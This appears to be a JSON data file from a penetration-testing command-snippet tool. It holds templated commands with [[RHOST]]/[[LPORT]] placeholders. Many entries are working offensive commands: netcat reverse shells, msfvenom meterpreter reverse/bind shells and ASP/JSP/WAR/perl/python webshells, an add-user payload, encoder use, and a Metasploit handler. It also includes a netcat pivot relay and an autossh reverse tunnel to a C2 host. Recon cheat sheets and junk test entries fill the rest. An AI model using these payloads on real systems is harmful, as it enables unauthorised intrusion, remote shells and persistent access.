{"commands": [{"note:": "this is a note for ls from far", "header": "  this is a header for ls from far ", "tags": " test, xx ", "source": " me, \"hi \"\"\"' ", "command": " ls - l\r\na\r\n\r\nxx ", "id": 1}, {"source": "", "header": "netcat listener", "command": "nc -nlvp [[LPORT]]", "id": 2, "tags": "nc"}, {"source": "", "header": "netcat simple reverse shell", "command": "nc [[RHOST]] [[RPORT]] -e  /bin/bash", "id": 3, "tags": "nc, test, linux"}, {"source": "", "header": "netcat reverse shell", "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [[RHOST]] [[RPORT]] >/tmp/f > /bin/bash", "id": 4, "tags": "nc, shell, linux"}, {"source": "", "header": "catheader", "command": "cat", "id": 5, "tags": "nc, test, windows"}, {"source": "", "header": "netcat simple reverse shell windows", "command": "nc [[RHOST]] [[RPORT]] -e  cmd.exe", "id": 6, "tags": "nc, test, windows"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom meterpreter reverse shell windows", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[[LHOST]] LPORT=[[LPORT]] -f exe > reverse.exe", "id": 60, "tags": "msf, metasploit, Windows, Payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom meterpreter bind shell windows", "command": "msfvenom -p windows/meterpreter/bind_tcp RHOST= [[RHOST]] LPORT=[[LPORT]] -f exe > bind.exe", "id": 61, "tags": "msf,  metasploit, bind,  Windows, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom create user windows", "command": "msfvenom -p windows/adduser USER=[[USER]] PASS=[[PASS]] -f exe > adduser.exe", "id": 62, "tags": "msf,  metasploit, create, user,  Windows, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom encoder windows", "command": "msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe", "id": 63, "tags": "msf,  metasploit, Windows, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom meterpreter reverse shell linux", "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[[LHOST]] LPORT=[[LPORT]] -f elf >reverse.elf", "id": 64, "tags": "msf, linux,  metasploit, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom meterpreter bind shell linux", "command": "msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=[[RHOST]] LPORT=[[LPORT]] -f elf > bind.elf", "id": 65, "tags": "msf, linux, metasploit,  payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom generic shell linux", "command": "msfvenom -p generic/shell_bind_tcp RHOST=[[RHOST]] LPORT=[[LPORT]] -f elf > term.elf", "id": 66, "tags": "msf, linux, metasploit,  payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom reverse ASP webshell", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[[LHOST]] LPORT=[[LPORT]] -f asp >reverse.asp", "id": 67, "tags": "msf, asp, web , metasploit,  shell, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom reverse JSP webshell", "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=[[LHOST]] LPORT=[[LPORT]] -f raw > reverse.jsp", "id": 68, "tags": "msf, jsp, web ,  metasploit, shell, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom reverse WAR webshell", "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=[[LHOST]] LPORT=[[LPORT]] -f war > reverse.war", "id": 69, "tags": "msf, war, web ,  metasploit, shell, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom reverse perl webshell", "command": "msfvenom -p cmd/unix/reverse_perl LHOST=[[LHOST]] LPORT=[[LPORT]] -f raw > reverse.pl", "id": 70, "tags": "msf, perl, metasploit,  script, web , shell, payload"}, {"source": "http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/", "header": "msfvenom python reverse webshell", "command": "msfvenom -p cmd/unix/reverse_python LHOST=[[LHOST]] LPORT=[[LPORT]] -f raw > reverse.py", "id": 71, "tags": "msf, python, metasploit, script, web , shell, payload"}, {"source": "", "header": "python pty shell", "command": "python -c'import pty;pty.spawn(\"/bin/bash\");'", "id": 72, "tags": "python, pty, bash, sh"}, {"source": "", "header": "unicorn msf resource", "command": "use multi/handler\r\n    set payload windows/meterpreter/reverse_https\r\n    set LHOST [[LHOST]]\r\n    set LPORT [[LPORT]]\r\n    set ExitOnSession false\r\n    set EnableStageEncoding true \r\n    exploit -j", "id": 200, "tags": "msf, metasploit, meterpreter, windows, shell"}, {"source": "xx", "header": "ls v2", "command": "ls v2 xx", "id": 1999, "tags": "xx"}, {"source": "me", "tags": "t", "command": "c1\r\nc3\r\nc4\r\nc5\r\nc6\r\nc7\r\n", "id": 19993, "header": "h"}, {"source": "", "tags": "ns, dns, recon", "command": "host -t ns [[DOMAIN]]", "id": 50, "header": "dns nameserver lookup"}, {"source": "", "header": "dns address lookup", "command": "host -t a [[DOMAIN]]", "id": 51, "tags": "ns, dns, recon"}, {"source": "", "tags": "ns, dns, recon, ipv6", "command": "host -t aaaa [[DOMAIN]]", "id": 52, "header": "dns AAAA record lookup"}, {"source": "", "header": "dns mail server lookup", "command": "host -t mx [[DOMAIN]]", "id": 53, "tags": "ns, dns, recon, ipv6, mail, mailserver"}, {"source": "", "tags": "ns, dns, recon, reverse", "command": "host [[IP]]", "id": 54, "header": "dns reverse lookup"}, {"source": "", "header": "dns zone transfer", "command": "host -l [[DOMAIN]] [[DNS-SERVER]]", "id": 55, "tags": "ns, dns, recon, zone transfer"}, {"source": "", "header": "dns lookup multiple infos", "command": "host -a [[DOMAIN]]", "id": 56, "tags": "dns, recon"}, {"source": "sans", "tags": "strings, file, meta, metadata", "command": "strings -e b [[FILENAME]]", "id": 75, "header": "strings find 16bit big-endian"}, {"source": "sans", "header": "strings find 16bit little-endian", "command": "strings -e l [[FILENAME]]", "id": 76, "tags": "strings, file, meta, metadata"}, {"source": "sans", "header": "tcpdump cheat sheet", "command": "tcpdump \r\n-n use numbers for hosts \r\n-nn use numbers for hosts and ports \r\n-i interface -v verbose -w dump to file \r\n-x print hex -X print hex and ascii -A print ascii \r\n-s snaplength (length of packet, on older systems 0 for complete packets)", "id": 77, "tags": "tcpdump, tcp, traffic"}, {"source": "", "tags": "recon, trace, traffic, tcp", "command": "traceroute -f set initial ttl \r\n-g (-j for Windows)[hoplist] specify route \r\n-I use ICMP instead of UDP \r\n-T use TCP-SYN instead of UDP \r\n-m [n] set maximum number of hops \r\n-n print numbers not names \r\n-p port for UDP set base destination port to start with for TCP set fixed destination port \r\n-w [N] wait before giving up and writing \r\n*** (default 5) -4 force use IPv4 -6 force use IPv6", "id": 78, "header": "traceroute cheat sheet"}, {"source": "", "header": "nmap cheat sheet", "command": "nmap\r\n--packet-trace  Show all packets sent and received\r\n-Pn             no ping, just scan\r\n-sS             syn scan (stealth scan)\r\n-sn             highly relayable (ICMP may be filtered by Firewalls)\r\n-p 1-1024       scan these ports\r\n\r\n**while running**\r\n\r\np = turn on packet tracing\r\nv = increase verbosity\r\nd = increase debug level\r\nshift +p|v|d inverts function\r\n\r\n\r\n**timing options**\r\n\r\n-T\r\n0 --> paranoid 5 min betwween packets\r\n1 --> sneaky 15 sec between packets\r\n2 --> polite 0,4 sec between packets\r\n3 --> normal scans parallel (default)\r\n4 --> aggressive scans parallel, waits only 1,25 sec between probes\r\n5 --> insane max 15 min per host, waits only 0.3 sec between probes\r\n\r\n\r\n--host_timeout          --> max time on a single host\r\n--max_rtt_timeout       --> max time to wait for the next probe\r\n--min_rtt_timeout       --> min timeout for probes\r\n--initial_rtt_timeout   --> default 6 sec, nmape lowers this value \r\n                    when network is performant\r\n--max_parallelism       --> number of probes nmaps sends in parallel\r\n--scan_delay            --> min time to wait before next probe\r\n\r\n\r\n**output options**\r\n\r\n-oN [filename] --> store output in normal format (like seen on screen)\r\n-oG [filename] --> store in grepable form \r\n           (on line per host with all the data in it)\r\n-oX [filename] --> store as xml\r\n-oS [filename] --> script kiddie format\r\n-oA [filename] --> store in normal, grepable and xml Format\r\n\r\n-Pn             --> target is not probed before scanning\r\n-P0             --> target is not probed before scanning\r\n-sP [options]   --> performs standard probing when no options are given\r\n-PE             --> send ICMP echo request (Type 8)\r\n-PB             --> same as default\r\n-PS[portlist]   --> use TCP SYN on this port\r\n-PP             --> send ICMP timestamp request (Type 13)\r\n-PM             --> send ICMP address mask request (Type 17)\r\n-PR             --> Use ARP to identify hosts \r\n                (works only on the same subnet)\r\n\r\n-F              --> scans only the top 100 ports\r\n--top-ports [n] --> scans only the top n ports\r\n-p 0-65535      --> scans all ports\r\n-p 22,23        --> scans only port 22 and 23\r\n-r              --> do not scan in random order (random is default)\r\n\r\n**TCP-scans**   \r\n\r\n-sP             --> Pingsweep (ARP on the same subnet, otherwise ICMP)\r\n-sT             --> TCP connect scan (complete 3way-handshake)\r\n-sS             --> half open or Stealth scan\r\n                 is default\r\n                 only works with root\r\n                 can still be detected by firewall\r\n\r\n-sA             --> ACK scan \r\n                can get you past firewall blocks\r\n                good for mapping networks (find hosts)\r\n                does no port scanning\r\n\r\n-sF             --> set FIN bit for all packets\r\n-sN             --> sets no bits\r\n-sX             --> sets FIN,PSH,URG bits (christmas scan)\r\n--scanflags     --> sets URG,ACK,PSH,RST,SYN,FIN,ECE,CWR, ALL, NONE\r\n                z.B.: --scanflags URGRSTFIN\r\n--badsum        --> firewall or IDS spotting.\r\n                end system will reject packets (sends no RESET) \r\n                but fw sometimes send RESET or ICMP port unreachable\r\n                TTL may also indicate a fw.\r\n\r\nNSE\r\n        \r\n**Goals of nse scripting engine**\r\n\r\n- alow arbitrary messages to be sent or received to multiple targets,\r\n  runnung in parallel\r\n- easily extensable through community scripts\r\n- support extende network discovery (whois, DNS, ...)\r\n- perform advanced version detecting\r\n- detect infacted or backdoored systems\r\n- exploit discovered vulns\r\n\r\n- extrem usefull for scanning and measuring a \r\n  small number of items across a large number of systems\r\n\r\n**commands**\r\n\r\nnmap -sC [target] -p [ports]    --> run all scripts in \"default\"\r\n\r\nrun specific script:\r\nnmap --script=[all, category, dir, script] [target] \r\n\r\n--script-trace                  --> detailed output \r\n--script-help                   --> get description \r\n--script-args                   --> get args\r\n\r\n", "id": 79, "tags": ""}, {"source": "", "tags": "traffic, tcp. ip, arp, ether", "command": "scapy\r\nls()                --> list supported protocols\r\nls(TCP)             --> list fields for TCP-protocol\r\nlsc()               --> list functions\r\nhelp(arpcachepoison) --> show help for a function\r\n\r\nbuild packets from lower level to higher:\r\npacket = IP(dst=\"127.12.12.12\")/TCP(dport=23)/\"Hello\"\r\n\r\n**show content of packet:**\r\npacket\r\nls (packet)\r\npacket.summary()\r\npacket.show()\r\npacket.sport\r\npacket[TCP].flags = \"SA\"\r\npacket.sprintf(\"%TCP.flags%\")\r\n\r\n**build packet:**\r\n\r\npacket = IP(dst=\"10.12.12.12\")\r\npacket = IP(dst=\"10.10.10/24\")\r\npacket = IP(dst=\"domainname.de\")\r\npacket = IP(dst=\"domainname.de/24\")\r\npacket = IP(dst=[\"10.12.12.12\",\"10.12.12.7\",\"10.12.12.9\"])\r\npacket = IP(dst=\"10.12.12.12\")/TCP(dport=1,1024)        \r\n    --> all ports from 1 to 1024\r\npacket = IP(dst=\"127.12.12.12\")/TCP(dport=[23, 25])     \r\n    --> ports 23 and 25\r\npacket = IP/TCP(flags=\"AR\") \r\n    --> ACK RESET flags=\"RA\" makes no difference\r\n\r\n**send packets:**\r\n\r\nsend()      --> sends packets at layer3 or higher\r\nsemdp()     --> sends packets at layer 2\r\nsr()        --> send and receive packerts at layer 3\r\nsrp()       --> send and receive packets at layer 2\r\nsr1()       --> send packets at layer 3 and return only the first answer\r\nsrp1()      --> send packets at layer 2 and return only the first answer\r\n\r\n**options:**\r\n\r\nfilter=[bpf packet filter]  --> same filter as in TCPDUMP\r\ntimeout=[n]                 --> wait n seconds for a response\r\nretry=[n]                   --> resend 3 times\r\nifeace=[interface name]     --> interface to send and receive\r\n\r\n**responses:**\r\n\r\nrsp=sr(packet)              --> view with rsp[0] or rsp[0][0]\r\nanswered, unanswered=sr(packet)\r\nans, unans=_                --> latest results is stored in \"_\"\r\nans.summary()\r\nans[3]                      ports set to (1,1024), this is port 3\r\n\r\n**loops:**\r\n\r\nsrloop(packet)              \r\nor\r\n\r\nfor var in list:\r\nstatement\r\n\r\nsniffing and reading packets:\r\npackets=sniff(filter=\"[filter]\")\r\nsniff(count=[N])            --> scapy is slow, may miss packets\r\nrdpcap(\"[filename]\")        --> read packets from pcap file\r\nwrpcap(\"[filename]\"), packets--> write pcap file\r\nwireshark ([packets])       --> starts wireshark", "id": 80, "header": "scapy cheat sheet"}, {"source": "", "header": "nmap run all scripts in default", "command": "nmap -sC [[RHOST]] -p [[RPORT]]  ", "id": 81, "tags": "scan, recon"}, {"source": "", "tags": "scan, recon", "command": "nmap -sC -sV -oA [[OUTFILE]] [[RHOST]]", "id": 82, "header": "nmap run save scripts, versionscan, output in all formats"}, {"source": "", "header": "nmap run save default scripts, Versionscan, traceroute,  standard output ", "command": "nmap -A -o [[OUTFILE]] [[RHOST]]", "id": 83, "tags": "scan, recon"}, {"source": "", "tags": "", "command": "finger @[[RHOST]]", "id": 7, "header": "enum users with finger"}, {"source": "", "header": "enum users on MIS Server ", "command": "ypcat [[PASSWORD|GROUP]]]", "id": 8, "tags": ""}, {"source": "", "tags": "", "command": "ldapsearch [[SEARCHSTRING]]", "id": 10, "header": "enum users on ldap"}, {"source": "", "header": "netcat relais", "command": "nc -l -p [[LPORT]] 0<backpipe | nc [[RHOST]] [[RPORT]] | tee backpipe", "id": 9, "tags": "nc, pivot, pivoting, lateral, tunnel "}, {"source": "", "tags": "nc, win, dos, loop", "command": "for /l %i in (1, 1, 254) do ( for %p in (21,22,25,80,135,139) do nc -nvz [[RHOST]].%i %p ) 2>&1 | find \"open\"", "id": 11, "header": "netcat port scan windows"}, {"source": "", "tags": "windows, cmd, cmd.exe", "command": "for %A in (1 2 3) do echo %A", "id": 12, "header": "dos loop"}, {"source": "", "header": "dos loop through file line by line", "command": "for /F \"tokens=*\" %%A in (myfile.txt) do [[command]] %%A", "id": 13, "tags": "dos commanline windows"}, {"source": "", "tags": "dos, windows, commandline, cmd, cmd.exe", "command": "for /l %i in (1,1,1000) do myprog.exe", "id": 14, "header": "dos loop by range"}, {"source": "  ", "header": "  bash loop ", "command": " for var in $(ls) do\r\n cat $var \r\ndone ", "id": 15, "tags": " linux, commandline, bash"}, {"source": "", "tags": "linux, commandline", "command": "for i in {1..10}\r\ndo\r\necho \" result is $i\"\r\ndone", "id": 16, "header": "bash loop by range"}, {"source": "", "header": "ssh generate Key", "command": "cd .ssh/id_rsa \r\neval \"$(ssh-agent)\" \r\nssh-keygen \r\nssh-add ~/.ssh/id_rsa/kalikey \r\nchmod 600 ~/.ssh/id_rsa \r\nssh-copy-id pi@[[RHOST]]\r\n", "id": 17, "tags": "ssh tunnel public key private key"}, {"source": "", "tags": "config tmux", "command": "bind-key j command-prompt -p \"join pane from:\"  \"join-pane -s '%%'\"\r\nbind-key s command-prompt -p \"send pane to:\"  \"join-pane -t '%%'\"\r\n\r\nset -g base-index 1\r\n\r\n# Automatically set window title\r\nset-window-option -g automatic-rename on\r\nset-option -g set-titles on\r\n\r\n#set -g default-terminal screen-256color\r\nset -g status-keys vi\r\nset -g history-limit 10000\r\n\r\nsetw -g mouse on\r\nsetw -g monitor-activity on\r\n", "id": 18, "header": "tmux.conf"}, {"source": "", "header": "tmux cheat sheet", "command": "https://gist.github.com/MohamedAlaa/2961058", "id": 19, "tags": ""}, {"source": "", "tags": "", "command": "ssh -L [[LPORT]]:user@[[RHOST]]:[[SSHPORT]] user@[[PROXYHOST]] \r\nssh -N -L localhost:3306:Target_MACHINE:3306 BRIDGE_MACHINE_USER@BRIDGE_MACHINE", "id": 20, "header": "SSH relay"}, {"source": "", "header": "SSH copy file to netcat listener   openSSH >= 5.4", "command": " cat x.txt | ssh -W [[RHOST]]:[[RPORT]] [[USER]]@[[RHOST]]", "id": 21, "tags": ""}, {"source": "    ", "header": "    autossh  ", "command": "  on TargetHOST:\r\n1. copy TargetHOSTs ssh public key to c2HOSTs .ssh/authorized_keys\r\n2. connect to c2-Server with ssh [[C2USER]]@[[C2HOST]] and logout\r\n3. sudo autossh -M 0 -f -T -N -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -R localhost:$[[RPORT]]:localhost:22 [[C2USER]]@[[C2HOST]] \r\n\r\non C2HOST: \r\nssh [[TargetUSER]]@localhost -p [[RPORT]]  ", "id": 22, "tags": "  reverse ssh tunnel  "}]}